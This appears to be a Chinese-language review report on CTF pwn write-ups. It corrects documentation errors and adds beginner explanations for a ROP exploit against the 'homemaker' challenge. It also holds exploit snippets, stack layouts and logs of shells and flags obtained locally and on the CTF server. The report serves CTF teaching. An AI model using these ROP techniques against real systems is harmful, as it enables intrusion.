  而 `pwn5/exploit.py` 第 22 行是 `BIN = './homemaker'`（相對路徑），
  在 repo 根目錄執行會得到 `[ERROR] './homemaker' does not exist`。
* **驗證指令**：
  ```bash
  cd /home/kzzz/Documents/code/ctf/sunshine && python3 pwn5/exploit.py
  # → [ERROR] './homemaker' does not exist
  ```
* **建議新增**（放在 §9「實際執行結果」最前面）：
  ```markdown
  > ⚠️ **一定要 `cd pwn5/` 之後再跑**，因為 `exploit.py` 用的是相對路徑 `./homemaker`。
  > 或直接用 `wp/run_all.sh pwn5`（它會自動 cd 進題目目錄、並且附上正確的 port）。

  ```bash
  cd pwn5
  python3 exploit.py              # 本地
  python3 exploit.py REMOTE       # 遠端 chal.sunshinectf.games:26008
  ```
  ```

### P2 級（小錯／不一致，建議一併修）

| # | 檔案 / 行 | 原文 | 實際 | 驗證指令 | 建議替換 |
|---|---|---|---|---|---|
| P2-1 | `pwn5/notes.md` 60 | `組語長這樣（本題 checksum @ 0x11ff）` | `checksum` 函式起點是 **`0x11e9`**；`0x11ff` 只是函式內的 `mov rax,QWORD PTR fs:0x28`（同一份文件 §2 表格第 108 行寫的 `0x11e9` 才對） | `objdump -d -M intel --start-address=0x11e9 --stop-address=0x1210 pwn5/homemaker` | `組語長這樣（本題 checksum @ 0x11e9；下面是它載入金絲雀那一段）：` |
| P2-2 | `pwn5/notes.md` 26–32 | checksec 區塊把 `RUNPATH` 放在最後 | 實際輸出 `RUNPATH` 在 `PIE` 之後、`SHSTK` **之前** | `python3 -c "from pwn import *; print(ELF('pwn5/homemaker',checksec=False).checksec())"` | 直接照實際順序貼（RELRO / Stack / NX / PIE / **RUNPATH** / SHSTK / IBT） |
| P2-3 | `wp/00` 679 | `e.address                  # PIE base（本地）` | 對 PIE 檔從磁碟讀，`ELF('./chal').address` 是 **`0x0`**（實測）；只有接上 process/remote 後才有意義 | `python3 -c "from pwn import *; print(hex(ELF('pwn5/homemaker',checksec=False).address))"` → `0x0` | `e.address   # 磁碟上的 PIE 檔是 0x0；接上 process 後才是真正的 base（PIE 要靠 leak 才知道）` |
| P2-4 | `wp/00` 755（§13） | `b *main+42` | stripped binary 會回 `No symbol table is loaded.`（本系列 pwn1、pwn5 都是 stripped） | `gdb -q -batch -ex 'b *main+42' ./pwn1/challenge` | `b *main+42                        # 只有「未 strip」才能這樣寫；stripped 請用 b *0x401234` |
| P2-5 | `wp/00` 547（§10.7）／799（§14） | `（「ret2csu」也是一招）`／`ropper -f ./chal --search "pop rdi"` | `ret2csu` 從未定義；`ropper` 本機未安裝且 §2 沒教怎麼裝 | `command -v ropper` → 無輸出 | 「`ret2csu`＝用 libc 初始化時留下的 `__libc_csu_init` 那兩個 gadget 來一次設定 `rdi/rsi/rdx`，詳見 §14 補充」＋ §2 加 `pip install ropper`（或直接刪掉 ropper 那兩行，只留 ROPgadget） |
| P2-6 | `wp/99` 127–128 | `frame.rip = SYSCALL_RET     # 一個 syscall 指令的位址` / `frame.rsp = binsh + 0x200` | 兩行都沒說「`SYSCALL_RET` 最好只含一個 `syscall`，之後不要再 `ret`」以及「`frame.rsp` 必須是**合法且可寫**的位址（通常 16-byte 對齊）」 | 讀 `pwn1/notes.md` §5.3 對照 | 補成 `frame.rip = SYSCALL_RET   # 只放「syscall」那條指令；執行完就換 rax=59 的 execve，不要再 ret` / `frame.rsp = binsh + 0x200   # 必須是合法可寫位址，且建議 16-byte 對齊` |
| P2-7 | `wp/99` 134 | `送出「剛好 15 bytes」讓 rax = __NR_rt_sigreturn` | `__NR_rt_sigreturn` 這個名字在 `99` 裡沒有定義（`00` §7 的表叫 `rt_sigreturn`，編號 15） | `grep -n "rt_sigreturn" wp/99_速查表.md` | `送出「剛好 15 bytes」讓 rax = 15（= __NR_rt_sigreturn，SROP 的 syscall 編號，見 00 §7）` |
| P2-8 | `wp/99` 13–18（§1） | 表格只有 PIE / Canary / NX / Full RELRO 四列 | 沒有 **Partial RELRO** 這一列，而本系列 pwn2/pwn3/pwn4/pwn6 全是 Partial RELRO | `python3 -c "from pwn import *; print(ELF('pwn2/mad_libs',checksec=False).checksec())"` | 補一列 `| Partial RELRO | `.got` 唯讀、`.got.plt` 可寫 → **可以改 `xxx@got` 劫持函式** | No RELRO：GOT 完全可寫 |` |
| P2-9 | `wp/99` 217（§10） | `b *0x401234` | PIE binary 用固定位址下中斷點會失敗（本系列 pwn2/pwn5/pwn6 都是 PIE） | `gdb -q -batch -ex 'b *0x401234' ./pwn5/homemaker` | 加一行 `# PIE 檔請改成 b *base+0x1234，或先 starti 再 b *$pc+…` |
| P2-10 | `wp/README.md` 43–60 | 樹狀圖 | 樹裡沒有 `00_recon.md`；`pwn3/` 少了它實際附的 `libc-2.39-0ubuntu8.3.so.6`；每題都有 `flag.txt`（假 flag）但樹裡沒寫 | `ls -1 pwn3/` ; `ls wp/00_recon.md` | 見 P0-5 的建議樹（已把 `00_recon.md`、`flag.txt`、`libc-2.39…` 補進去） |

---

## 2. 新手卡點（每一項都給「可直接貼上的補充文字」）

### B2-1 pwn5：**「誰吃掉堆疊上的哪一格」沒有實測表** —— 這是 ROP 最核心的一步

`notes.md` §6.1 只給了一張概念圖，§7.1 又畫錯（P0-1）。
新手真正需要的是「每一步 `rsp` 在哪」的逐步表。**建議在 §6.3 後面插入**（數字是我實測的）：

````markdown
#### ROP 鏈是怎麼被「一格一格吃掉」的？（實測追蹤，ASLR 關閉）

`leave; ret` 之後，`rsp` 每被 `ret` 彈掉一個值就 `+8`，於是堆疊上的一格格子依序變成「指令」：

| 步驟 | 執行到哪 | 這一刻 `rsp` | 這一步做什麼 |
|---|---|---|---|
| 0 | `0x1a7d leave` | `0x7fffffffdcb0` | `rsp = rbp` → `pop rbp` → `rsp = rbp+8` |
| 1 | `0x1a7e ret` | `0x7fffffffddd8` | 彈 `[rbp+8]` 進 `rip` → `rip = PIE+0x101a`（對齊用 `ret`） |
| 2 | `0x101a ret` | `0x7fffffffdde0` | 彈 `[rbp+0x10]` → `rip = PIE+0x12aa`（`pop rdi; ret`） |
| 3 | `0x12aa pop rdi` | `0x7fffffffdde8` | `rdi = [rbp+0x18]` = `"/bin/sh"` 的位址；`rsp += 8` |
| 4 | `0x12ab ret` | `0x7fffffffddf0` | 彈 `[rbp+0x20]` → `rip = PIE+0x10c0`（`system@plt`） |
| 5 | `system` 第一道指令 | `0x7fffffffddf8` | `rsp & 0xf == 8` ✅ → `movaps` 不會炸，`system("/bin/sh")` |

```
堆疊（rbp = 0x7fffffffddd0）：
  rbp+0x00  0x7fffffffde60        saved rbp（保留原值）
  rbp+0x08  0x000055555555501a    ← 回傳位址 = chain[0] = ret        （第 1 步吃掉）
  rbp+0x10  0x00005555555552aa    ← chain[1] = pop rdi; ret          （第 2 步吃掉）
  rbp+0x18  0x0000555555558a54    ← chain[2] = "/bin/sh"             （第 3 步 pop 進 rdi）
  rbp+0x20  0x00005555555550c0    ← chain[3] = system@plt            （第 4 步吃掉）
  rbp+0x28  0x0000000000000000    ← chain[4] = system 的回傳位址     （第 5 步 system 看到）
```

> 💡 看懂這張表就懂了 ROP：**「堆疊 = 一張指令清單；每個 `ret` 讀一格、跳到那格寫的位址」**。
> 所以排 payload 時只要問自己兩件事：
> 1. 這個 gadget 會從 `rsp` 讀幾格？（`pop rdi; ret` 讀 1 格參數 + 1 格下一步 = 2 格）
> 2. 我現在這一格在記憶體裡的**位址**對不對？（要用 `state[i] = payload[i+1]` 換算，見 §7.3）
````

### B2-2 pwn5：**沒有解釋「`state[0x120]` 之後明明蓋掉了 `main` 的金絲雀，為什麼不會 `__stack_chk_fail`」**

這是最容易讓人懷疑「我是不是做錯了」的地方——payload 從 `state[0x120]` 開始寫，
正好蓋到 `main` 的區域變數（`rbp_main-0x10`）、**`main` 的金絲雀（`rbp_main-8 = state[0x128]`）**、
`main` 的 saved rbp（`state[0x130]`）與 `main` 的回傳位址（`state[0x138]`）。

**建議在 §7.3 表格後面補**：

```markdown
> ❓ **為什麼把 `main` 的金絲雀蓋爛了也不會 `stack smashing detected`？**
> 因為 `main` 的收尾程式碼（`0x1aa4 mov rdx,[rbp-8]` / `0x1aa8 sub rdx,fs:0x28`）
> **根本不會被執行到**：我們的鏈是從 `service_loop` 的 `ret`（`0x1a7e`）直接跳走的，
> `service_loop` 一旦 `ret`，控制權就永遠離開 `main` 了。
> `main` 的框架、`main` 的金絲雀、`main` 的回傳位址對我們來說都只是「後面的格子」，不會被檢查也不會被用到。
>
> ⚠️ 但**`service_loop` 自己的金絲雀（`state[0x108]`）一定要原樣寫回**，
> 因為它的檢查在我們的鏈**之前**（`0x1a76`）。這兩個金絲雀是**不同的儲存格**，只是值剛好相同
> （同一個執行緒的 `fs:0x28`）。
```

### B2-3 pwn5：**off-by-one 的「那一個 byte」是哪一個，圖示不夠直觀**

`notes.md` §5.1/§7.4 講對了，但「第 257 個 byte = 訊框 CRC」這件事對新手很抽象。
**建議在 §5.1 的說明後面補一張「訊框 vs state 的對應表」**：

````markdown
**為什麼第 257 個 byte 是「訊框的 CRC byte」？把訊框與 `state` 對齊來看就懂了：**

```
我們送出的位元組（L = 0x101）：
  offset 0        1        2 .. 0x100        0x101      0x102 0x103
         ┌────────┬───────────────────────┬──────────┬────────────┐
         │ opcode │ data（0x100 bytes）    │  CRC8    │ ESC \      │
         └────────┴───────────────────────┴──────────┴────────────┘
            =2        A A A ... A            ← 就是這一個！

append() 從 payload+1 開始複製，複製 n+1 = 0x101 個 byte：
  state[0x000 .. 0x0ff] ← data      （0x100 bytes，正常範圍）
  state[0x100]          ← CRC8      ← one past the end！這裡是 capacity 的低位 byte
```

* 所以 **CRC 不是我們「想填什麼就填什麼」**——它是整條 payload 的函數值。
* 我們要的是 `state[0x100] = 0xff`（讓 capacity `0x0100 → 0x01ff`），
  所以只能**反解**：固定其他 byte，枚舉其中一個 byte 直到 `crc8(payload) == 0xff`。
* 這題剛好**只有唯一解**（實測 `v=0xcd`），因為 CRC8 對單一 byte 是**雙射**（一對一）。
````

### B2-4 wp/00 §4 在教「暫存器／堆疊」之前就用了它們

§4.1 的 canary 範例（第 169–178 行）用了 `fs:0x28`、`[rbp-8]`、`je`、`call`，
但暫存器在 §5、堆疊框架在 §6 才教。照閱讀順序讀會撞牆。
**建議在 §4 開頭加一行**：

```markdown
> 📌 這一節會用到 `rbp`、`rsp`、`fs:0x28`、`je` 這些名字。
> 如果還不熟，**先跳到第 5、6 節看完再回來**（保護機制要先知道「它保護什麼」才看得懂）。
> 這五個保護的「結論」比「原理」重要：先記住它們對解題的限制，原理稍後補。
```

### B2-5 `wp/00` 沒有任何「一次完整動手做」的電光石火時刻

新手讀完 §10 的 ROP 觀念後，手邊沒有任何**可以立刻跑出結果**的範例
（§12 的骨架用 `p64(0x401234)` 佔位符，跑起來一定是 SIGSEGV）。
**建議在 §10.7 之後加一個「5 分鐘做完的第一條 ROP 鏈」**：

````markdown
### 10.8 動手做一次：你人生第一條 ROP 鏈（用 pwn5 當教材，5 分鐘）

不需要懂 pwn5 的漏洞，只要跟著做，就能看到「堆疊變成一張指令清單」：

```bash
cd pwn5
python3 exploit.py        # 本機，會印出 canary / PIE base / flag
```

看它做的事（`exploit.py` 第 109–131 行）就是本節教的全部：

```python
pop_rdi = pie + 0x12aa          # §10.2 gadget：pop rdi; ret
system  = pie + 0x10c0          # §10.3 目標：system@plt
binsh   = pie + 0x4a54          # §10.3 參數："/bin/sh" 的位址（我們自己寫在 .bss 的）
ret     = pie + 0x101a          # §10.4 對齊用 ret

chain  = [pop_rdi, binsh, system]         # 「最小鏈」
if (saved_rbp + 0x10) % 16 == 0:          # §10.4 需要對齊時
    chain = [ret] + chain                 #   在最前面補一個 ret
payload = ... + b"".join(p64(w) for w in chain)
```

想親眼看到它跑：把 `exploit.py` 的 `payload += p64(chain[0])` 那行前面加
`print(chain)`，或在 gdb 裡對 `system@plt` 下中斷點，你會看到 `rdi` 正好是 `"/bin/sh"`。
````

### B2-6 pwn5：`saved_rbp + 0x10` 這個對齊判斷式「看起來很魔法」

`exploit.py` 第 118 行寫 `if (saved_rbp + 0x10) % 16 == 0:`，而 §6.3 講的是
「`(rbp+0x10) % 16`」。兩者相差 `0x20`（= `2×16`，所以同餘），但文件沒說清楚，
新手會以為自己算錯。**建議在 §6.3 的程式碼旁邊補**：

```markdown
> 💡 **為什麼 exploit 裡寫的是 `saved_rbp + 0x10`，而不是 `rbp + 0x10`？**
> 我們洩漏不到 `service_loop` 的 `rbp`，只洩漏到它存起來的 **`main` 的 `rbp`**（`saved_rbp`）。
> 而 `rbp_service_loop = rbp_main - 0x20`（見 §4.11），
> 所以 `(saved_rbp + 0x10) % 16` 與 `(rbp_service_loop + 0x10 + 0x20) % 16`
> 只差 `0x20 = 32`，是 16 的倍數 → **奇偶性完全相同**，判斷結果一樣。
> 兩者可以互換，只是 `saved_rbp` 是我們手上真的有的數字。
```

### B2-7 wp/00／wp/99 都缺「失敗訊息對照表」

新手 90% 的時間在對著看不懂的錯誤發呆。**建議在 `wp/99` §11 檢查清單後面加**：

```markdown
## 12. 常見失敗症狀 → 原因對照表

| 你看到的 | 最可能的原因 | 先檢查 |
|---|---|---|
| `*** stack smashing detected ***` / SIGABRT | canary 沒對上（沒寫回、或 `state[i] = payload[i+1]` 這種整格位移的錯） | 洩漏到的 canary 有沒有「完整 8 bytes」寫回？payload 有沒有整體差一格？ |
| `SIGSEGV` 但位址看起來像位址（例如 `0x55…`） | 鏈跳到對的地方但**對齊錯了** → `movaps` 炸 | 用 gdb 在 `system` 第一道指令看 `rsp & 0xf` 是不是 8 |
| `SIGSEGV` 位址是 `0x0` 或 `0x41414141…` | 回傳位址被覆蓋後又 `ret` 到垃圾（鏈太短／結尾沒收好） | 鏈最後放一個 `0` 或 `exit@plt` 當結尾 |
| 程式卡住不動、連錯誤都沒有 | 讀進來的長度比你想的多（**big-endian 長度欄位**、或 `read` 吃掉了下一段） | `cat /proc/<pid>/syscall` 看它 `read` 要幾個 byte |
| `[ERROR] './chal' does not exist` | 在錯的目錄執行 | `cd` 進題目目錄，或用 `wp/run_all.sh` |
| `error: externally-managed-environment` | PEP 668 | 用發行版套件或 venv（見 `wp/00` §2） |
| `[ERROR] kernel architecture must be specified` | `SigreturnFrame()` 前沒設 `context.arch` | `context.arch = 'amd64'` |
| 遠端才失敗、本地成功 | 遠端 libc 版本不同 / 遠端有 seccomp（SROP 也被擋）/ 遠端 glibc `system` 路徑不同 | 用附的 libc；`seccomp-tools dump`；改用 `execve` 或「借別人的手」讀 flag |
```

### B2-8 pwn5：`notes.md` 引用 `exploit.py` 的地方跟檔案有細微不一致

`notes.md` §8 的逐行註解大致與 `exploit.py` 相符，但有兩處可以更精確：

| notes 寫的 | exploit.py 實際 | 建議 |
|---|---|---|
| 第 1103 行起「`payload = bytearray(b'\x02' + b'B' * 0x108)`」等 | 完全相同（第 121–129 行）✅ | 保留 |
| notes 沒有引用 `exploit.py` 第 116 行的註解 `# ROP chain starts at state[0x120] (rsp right after leave; ret)` | 語意正確（那是「鏈本體」的起點），但容易和 `chain[0]` 搞混 | 在 §7.3 補一句「`chain[0]`（也就是被蓋掉的那格回傳位址）在 `state[0x118]`；`state[0x120]` 是 `ret` 之後 `rsp` 的位置，也就是 `chain[1]`」 |
| notes 沒有提到 `assert len(payload) == 0x200`（`exploit.py` 第 130 行） | 這是存在的健全性檢查 | 補一句「`assert` 是你的安全網：訊框長度錯了就早點炸，不要讓它去猜」 |

### B2-9 `wp/00` §12 沒說「`p64()` 是 little-endian，但協定長度欄位可能是 big-endian」的**實例**

§12 第 738–741 行有提醒，但沒有給「怎麼寫」。
**建議直接接在該提醒後面補**：

```markdown
實際寫起來差別是這樣（pwn5 的訊框長度就是大端）：

```python
p16(0x101)                          # → b'\x01\x01'（小端） 剛好一樣，看不出差別
p16(0x500)                          # → b'\x00\x05'（小端） ❌ 伺服器會讀成 0x0500 → 卡死
(0x500).to_bytes(2, 'big')          # → b'\x05\x00'（大端） ✅ 正確
u16(hdr[2:4], endian='big')         # 讀回來也要指定大端
```

> 判斷方法：**看組語**。如果長度是由 `shr ax,8` 先存高位 byte（像 pwn5 的 `0x1400`），那它就是大端；
> 如果是直接 `mov WORD PTR [..],ax`，那就是小端（x86 的原生順序）。
```

---

## 3. round 1 修正的驗證結果（`wp/00`、`wp/99`）

我逐條重跑 round 1 指定的驗證方式，確認 `fixes_round1_applied.md` 的說法是否成立：

| round1 項目 | 應修內容 | 現況 | 驗證方式 |
|---|---|---|---|
| **E9** | `pip install seccomp-tools` → `gem install seccomp-tools` | ✅ **已修**（第 109 行：`gem install seccomp-tools   # 注意：這是 Ruby gem，不是 pip 套件（要先裝 ruby）`） | 讀第 109 行；`gem`/`ruby` 本機存在 |
| **E10** | `wp/99` `p = process('./chal'):` 去掉冒號 | ✅ **已修**（`wp/99` 第 198 行 `p = process('./chal')`） | `python3 -c "compile('p = process(1):','','exec')"` 會 SyntaxError，現行版本可編譯 |
| **E11** | 16-byte 對齊條件（`call` 前 `rsp%16==0`；函式第一道指令時 `rsp%16==8`） | ✅ **已修**（第 505–521 行，敘述正確，並說明「對齊用 ret 放哪裡都行」） | 閱讀第 505–521 行；並用 pwn5 的 gdb 單步實測驗證 `rsp&0xf==8` |
| **E6** | `wp/99` chunk 結構（`+0x00 prev_size`、`+0x08 size`、**`+0x10 user data`**） | ✅ **已修**（第 171–179 行），且與下方 free 表自洽（`+0x10 fd` / `+0x18 bk`） | 讀第 169–180 行；glibc `malloc_chunk` 標準定義 |
| **B5 / T9 / T14** | little-endian 定義 + 端序提醒 | ✅ **已補**（§1 名詞表第 69 行含 `p64(0x401040)` 的 byte 範例；§12 第 738–741 行的 🔴 提醒） | 讀該兩處；實測 `p64(0x401040).hex() == '4010400000000000'` ✅ |
| **B15** | `SigreturnFrame()` 前必須 `context.arch='amd64'` | ✅ **已補**（`wp/00` §11.4 第 601–604 行、`wp/99` §6 第 116–119 行） | 實測未設 `context.arch` → `[ERROR] kernel architecture must be specified` ✅ 警語正確 |
| **B16** | §10.2 加「位址是佔位符」 | ✅ **已補**（第 465–467 行） | 讀該處 |
| **B17 / T5** | `shellcode` / `TLS` / `ZF` 三詞定義 | ✅ **已補**（第 70 行 shellcode；第 170–171 行 fs:0x28 註解含 TLS；第 255、272–273 行 ZF） | `grep -n "shellcode\|TLS\|ZF" wp/00…` |
| **T1** | `non-PIE` 首次出現處加註 | ✅ **已補**（第 133 行「（這種 binary 叫 **non-PIE**，見 4.3 節）」） | 讀第 133 行 |
| **T2** | §4.4 RELRO 開頭加 GOT 指引 | ✅ **已補**（第 205 行「（`.got` / `.got.plt` 到底是什麼，見第 8 節；這裡先看結論。）」） | 讀第 205 行 |
| **T3** | `wp/99` §4 補 `@plt` 說明 | ✅ **已補**（第 68–70 行） | 讀該處 |
| **T4** | §1 名詞表加 `canary`、`RELRO` | ✅ **已補**（第 67–68 行） | 讀該處 |
| **S6 ③** | 「對齊用 `ret` 放哪裡都行」三處統一 | ✅ **已統一**（`wp/00` 第 520–521 行、`wp/99` 第 86–89 行都註明「放哪裡都行」） | 讀該兩處 |
| **S6 ⑤** | flag 檔命名規則 | ✅ **已補**（`wp/00` 第 889–893 行） | 讀該處 |

**結論：round 1 針對 `wp/00`、`wp/99` 的修正，逐條查證後全部正確套用，且沒有引入新的錯誤。**
（`wp/00` 現在的 `pip install seccomp-tools` 已不存在、`wp/99` 的冒號也已移除，
chunk 圖與 16-byte 對齊敘述都是正確版本。）

**但 round 2 新發現 5 條 P0**（其中 2 條在 `wp/00`：PEP 668 安裝、§6.3 圖；1 條在 `wp/99` 以外；
另外 `pwn5` 的 §7.1 圖與 `README` 的樹是新問題）——這些不在 round 1 的範圍內，屬於本輪新增。

---

## 4. 實測結果（真實輸出，PASS / FAIL）

### 4.1 `pwn5` 本地（`python3 exploit.py`，跑 3 次）

```
$ cd pwn5 && python3 exploit.py
[x] Starting local process './homemaker'
[+] Starting local process './homemaker': pid 3531354
[+] canary    = 0xcbfad12efd00000
[+] saved rbp = 0x7ffd65eef250
[+] PIE base  = 0x55fe6deae000
[+] shell should be up, sending commands
sun{LOCAL_DUMMY_FLAG}
total 176
…（略）
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

FLAG: sun{LOCAL_DUMMY_FLAG}
[*] Process './homemaker' stopped with exit code -11 (SIGSEGV) (pid 3531354)
```

後兩次：`PIE base = 0x56018f06a000 / 0x565012ccc000 / 0x55c708669000`，每次都 `FLAG: sun{LOCAL_DUMMY_FLAG}`。
**→ pwn5 local：PASS（3/3）**，與 `notes.md` §9.1 記載一致。

### 4.2 `pwn5` 遠端（`python3 exploit.py REMOTE`，跑 3 次）

```
$ python3 exploit.py REMOTE        # 第 1 次
[x] Opening connection to chal.sunshinectf.games on port 26008
[+] Opening connection to chal.sunshinectf.games on port 26008: Done
[+] canary    = 0x7a5e0edb6412d00
[+] saved rbp = 0x7ffc8f1067d0
[+] PIE base  = 0x57e3c7225000
[+] shell should be up, sending commands
sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
total 12
drwxr-xr-x 2 root root      4096 Sep 26 00:54 .
drwxr-xr-x 1 root root      4096 Sep 26 00:55 ..
-rw-r----- 1 root homemaker   64 Sep 26 00:54 flag.txt
uid=1337(homemaker) gid=1337(homemaker) groups=1337(homemaker)
DONE

FLAG: sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
```

第 2 次：`canary=0xee4f3d99a7d1ec00`、`PIE base=0x591b85eab000`、同一個 flag；
第 3 次：`canary=0xd134a04ba8c7a200`、`PIE base=0x600489976000`、同一個 flag。
**→ pwn5 REMOTE：PASS（3/3）**，flag 與 `pwn5/FLAG.txt`、
`notes.md` §9.2、`wp/README.md` 第 18 行、`wp/00` 附錄全部一致。
（`notes.md` §9.2 貼的遠端輸出 `total 12` / `-rw-r----- 1 root homemaker 64 … flag.txt` 與我實測**逐字相同**。）

### 4.3 `pwn5` 的 gdb 證據（重跑 `gdb_evidence.sh`）

```
@0x1797 append#1: n=0x100 capacity=0x100  -> n<=cap passes, loop writes n+1 bytes
@0x1810 send_state: state=0x7fffffffdcc0 capacity=0x1ff
@0x1797 append#2: n=0x1ff capacity=0x1ff  -> writes 0x200 bytes over canary/rbp/ret
@0x1a76 loop epilogue (canary check): rbp=0x7fffffffddd0 state=0x7fffffffdcc0 rsp=0x7fffffffdcb0
0x7fffffffddc8:	0xe4fbd8d3ee76a900	0x00007fffffffde60
0x7fffffffddd8:	0x000055555555501a	0x00005555555552aa
0x7fffffffdde8:	0x0000555555558a54	0x00005555555550c0
0x7fffffffddf8:	0x0000000000000000	0x0000000000000000
```
**→ 與 `notes.md` §5.3 完全相同：PASS**（含 `capacity=0x1ff`、`state = rbp-0x110`）。

### 4.4 ROP 鏈單步追蹤 + `system` 入口對齊（本輪新增的驗證）

```
@0x1a76 canary-check: rbp=0x7fffffffddd0 rsp=0x7fffffffdcb0
after leave:  rip=0x555555555a7e  rsp=0x7fffffffddd8
after ret:    rip=0x55555555501a  rsp=0x7fffffffdde0        ← chain[0] = PIE+0x101a（對齊用 ret）
after ret2:   rip=0x5555555552aa  rsp=0x7fffffffdde8        ← chain[1] = PIE+0x12aa（pop rdi; ret）
Breakpoint 4, 0x00005555555550c0 in system@plt ()
  rdi = 0x555555558a54        ← = PIE+0x4a54，指向我們放的 "/bin/sh"
  rsp = 0x7fffffffddf8
  rsp & 0xf = 8 (need 8)      ← ✅ 對齊正確
```
**→ 16-byte 對齊、`leave; ret`、鏈的每一格：PASS**，與 `notes.md` §5.3 引用的數字一致。
**同時證明了 P0-1**：`state[0x120]`（`rbp+0x10`）實際裝的是 `pop rdi; ret`（`PIE+0x12aa`），
不是 §7.1 圖上寫的 `ret`。

### 4.5 `wp/00` 裡每一段「可執行」指令的實測結果

| `wp/00` 位置 | 指令 | 結果 | 判定 |
|---|---|---|---|
| §2（Arch/Ubuntu） | `pip install pwntools` / `pip3 install pwntools` / `pip install ropgadget` | `error: externally-managed-environment`（PEP 668） | ❌ **FAIL**（P0-3） |
| §2 | `gem install seccomp-tools`（round 1 修正後） | 語法與安裝途徑正確（`gem`、`ruby` 都在；`seccomp-tools` 是 Ruby gem） | ✅ 說明正確 |
| §2 | `gem install one_gadget` | 正確（one_gadget 是 Ruby gem） | ✅ |
| §2 | `git clone pwndbg && ./setup.sh` | 正確的安裝流程（本機未裝，故 `vmmap`/`telescope`/`heap` 都不可用） | ✅ 但 §13 沒再提醒需要 pwndbg |
| §2 | `checksec --file=./challenge` | 本機有 `checksec`，輸出正確 | ✅ PASS |
| §2 | `python3 -c "from pwn import *; print(ELF('./chal', checksec=False).checksec())"` | 對 `homemaker` 印出 `Full RELRO / Canary found / NX enabled / PIE enabled / RUNPATH / SHSTK / IBT` | ✅ PASS |
| §2 | `sudo pacman -S patchelf` | 本機已有 `patchelf` | ✅ |
| §3/§15 | `readelf -S/-l/-s`、`nm`、`objdump -d -M intel`、`strings -n 6` | 全部正常執行 | ✅ PASS |
| §6.4 | `p = process('./chal')` / `p.sendline(cyclic(200))` / `cyclic_find(0x6161616b6161616a)` | `cyclic(200)[:32] = b'aaaabaaacaaadaaaeaaafaaagaaahaaa'`；`cyclic_find(0x6161616b6161616a)` → **`36`**（該值 = bytes `jaaakaaa`，正好是 offset 36 起的 8 bytes，**範例與結果自洽**） | ✅ PASS |
| §10.2 | `ROPgadget --binary ./chal \| grep "pop rdi"` | 找到 `0x12aa : pop rdi ; ret`（含未對齊變體） | ✅ PASS |
| §11.5/§14 | `ROPgadget --binary ./chal --opcode 0f05` | 選項存在（`--opcode <opcodes>`），本題無 syscall 故無輸出 | ✅ PASS（選項正確） |
| §14 | `ROPgadget --string "/bin/sh"` | 選項正確（本題沒有硬編 `/bin/sh` 故無輸出） | ✅ PASS |
| §14 | `ropper -f ./chal --search "pop rdi"` | **`ropper` 未安裝**，§2 也沒有安裝指示 | ⚠️ 未驗證（P2-5） |
| §12 | `p64/u64/p16/flat/cyclic/u32` 等一行 | `p64(0x401040) = 4010400000000000`、`p16(4) = 0400`、`flat([0x401234,0x401234]) = 3412400034124000`… 全部正確 | ✅ PASS |
| §12 | `e.symbols['main']`、`e.plt['printf']`、`e.got['printf']`、`e.bss()` | `elf.plt['system'] = 0x10c4`、`elf.got['system'] = 0x3fb8`、`e.bss() = 0x4020` 全部正常 | ✅ PASS |
| §12 | `e.address                  # PIE base（本地）` | 對 PIE 檔回傳 `0x0`（**註解會誤導**） | ⚠️ 註解錯（P2-3） |
| §12 | `rop.rdi = …` / `rop.call('system',[binsh])` / `rop.dump()` / `rop.chain()` | 正常運作（pwn5 的 `find_gadget(['pop rdi','ret'])` → `Gadget(0x12aa,…)`；`['syscall','ret']` → `None`，符合實際） | ✅ PASS |
| §12 | `next(libc.search(b'/bin/sh'))`、`libc.symbols['system']` | 正常（需真的有 `libc.so.6`） | ✅ PASS |
| §12 | `SigreturnFrame()`（未設 `context.arch`） | `[ERROR] kernel architecture must be specified`（§11.4 的警告正確） | ✅ 警告存在；但 §12 清單本身沒再提醒 |
| §12 | `DEBUG=1 python3 exploit.py` | `context.log_level` 仍是 `20`（info）→ **沒有開啟除錯** | ❌ **FAIL**（P0-4） |
| §12 | `python3 exploit.py REMOTE HOST=1.2.3.4 PORT=9999` | 語法正確（pwntools `args.HOST`/`args.PORT`；`wp/run_all.sh` 實際就用 `PORT=` 這種寫法且有效） | ✅ PASS |
| §13 | `set pagination off` / `set disassembly-flavor intel` / `b *0x401032` / `run < input.txt` / `x/10gx $rsp` / `info registers` / `p/x $rdi` / `x/20i $rip` / `si` / `ni` | 在 **non-PIE** 的 `pwn1/challenge` 上全部正常（實測輸出正確） | ✅ PASS |
| §13 | `b *main+42` | stripped binary → `No symbol table is loaded.` | ⚠️ 需加註（P2-4） |
| §13 | `vmmap` / `telescope` / `heap` / `bins` / `vis_heap_chunks` | 需要 pwndbg；本機未安裝故無法執行 | ⚠️ 需在文件再提醒一次（P2-5 同類） |
| §15 | `patchelf --set-interpreter … --set-rpath …`、`./ld-linux-x86-64.so.2 --library-path . ./challenge` | 語法正確（pwn2/pwn4/pwn6 真的附了 `ld-linux-x86-64.so.2` + `libc.so.6`） | ✅ PASS |

### 4.6 `wp/99` 可執行片段的實測

| 位置 | 指令 | 結果 | 判定 |
|---|---|---|---|
| §1 | `checksec --file=./chal` | 可執行 | ✅ PASS |
| §9 | `p = process('./chal')`（round 1 修正後） | 語法正確 | ✅ PASS |
| §9 | `cyclic_find(0x6161616b)` | → `40`（正常） | ✅ PASS |
| §7 | `'%{}$p'.format(i)` | → `%1$p`、`%2$p`… 語法正確（1-based，與表格一致） | ✅ PASS |
| §7 | `fmtstr_payload(offset, {target_addr: value}, write_size='short')` | 函式簽名正確（pwntools 提供；`write_size` 可為 `'byte'/'short'/'int'`） | ✅ PASS |
| §2 | 暫存器對應表（syscall 第 4 參數是 `r10`） | 正確 | ✅ PASS |
| §3 | syscall 編號 0/1/2/3/9/10/15/59/60/231 | 全部正確（x86-64） | ✅ PASS |
| §8 | chunk 佈局、`tcache` LIFO ≤7、safe-linking `ptr ^ (chunk>>12)`、hook 2.34 移除 | 全部正確 | ✅ PASS |
| §6 | SROP 模板 | 語法正確，但 `frame.rsp` / `SYSCALL_RET` / `__NR_rt_sigreturn` 三處說明不足 | ⚠️ 見 P2-6/P2-7 |
| §10 | gdb 指令 | 同 `wp/00` §13（PIE 位址 + pwndbg 需先裝） | ⚠️ 見 P2-9 |
| §11 | 打遠端前檢查清單 | 8 項全部合理（尤其是「不要用 `interactive()` 當唯一出口」） | ✅ PASS |

### 4.7 `run_all.sh` 與 README 的一鍵驗證

```
$ cd wp && ./run_all.sh pwn5
